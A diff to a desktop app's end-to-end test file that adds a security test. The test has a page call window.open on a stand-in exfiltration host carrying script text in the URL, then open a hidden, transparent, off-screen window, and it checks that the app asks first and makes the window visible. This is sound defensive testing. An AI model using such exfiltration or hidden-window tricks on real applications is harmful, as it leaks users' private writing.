@@ -1,7 +1,7 @@
 import { readFileSync } from 'node:fs';
 import { createServer, type Server } from 'node:http';
 import type { AddressInfo } from 'node:net';
-import { editor, expect, test } from './helpers';
+import { editor, expect, openedExternally, test } from './helpers';
 
 // What the session allows (Plan 6, Rulings D5 and D6): spellcheck with a bundled dictionary and no
 // download, no permission the app doesn't use, no network request from a page, and the site's
@@ -170,4 +170,37 @@ test('sends the site’s policy headers with its pages', async ({ desktop }) => 
     opener: null,
   });
   expect(headers.permissions).toContain('camera=()');
+});
+
+// A page that a hostile file had somehow made run code could put the script in an address and
+// hand it to the system browser, past the network block (red/blue audit, 2026-11-03). Only
+// Drafter's own links go at once; anything else waits for the writer's yes, and a hidden window
+// with the app's bridge can't be opened.
+test('asks before a page opens any address but Drafter’s own, and opens no hidden windows', async ({
+  desktop,
+  profile,
+}) => {
+  const { app, page } = await desktop();
+  await page.evaluate(() => {
+    window.open('https://exfil.invalid/open?d=INT.%20SECRET%20SCRIPT');
+    window.open('https://github.com/cschweda/drafter/releases');
+  });
+  await expect.poll(() => openedExternally(profile)).toHaveLength(2);
+  expect(openedExternally(profile)).toEqual([
+    'asked https://exfil.invalid/open?d=INT.%20SECRET%20SCRIPT',
+    'https://github.com/cschweda/drafter/releases',
+  ]);
+  // An app window asked for hidden, see-through, and unfocusable is made solid and focusable.
+  await page.evaluate(() => {
+    window.open('app://drafter/docs/saving/', 'hidden', 'opacity=0,focusable=no,x=-32000,y=-32000');
+  });
+  await expect.poll(() => app.windows().length).toBe(2);
+  const chrome = await app.evaluate(({ BrowserWindow }) => {
+    const windows = BrowserWindow.getAllWindows();
+    const last = windows.find((w) => w.webContents.getURL().includes('/docs/saving')) ?? windows[0];
+    return last
+      ? { opacity: last.getOpacity(), focusable: last.isFocusable(), visible: last.isVisible() }
+      : null;
+  });
+  expect(chrome).toEqual({ opacity: 1, focusable: true, visible: true });
 });
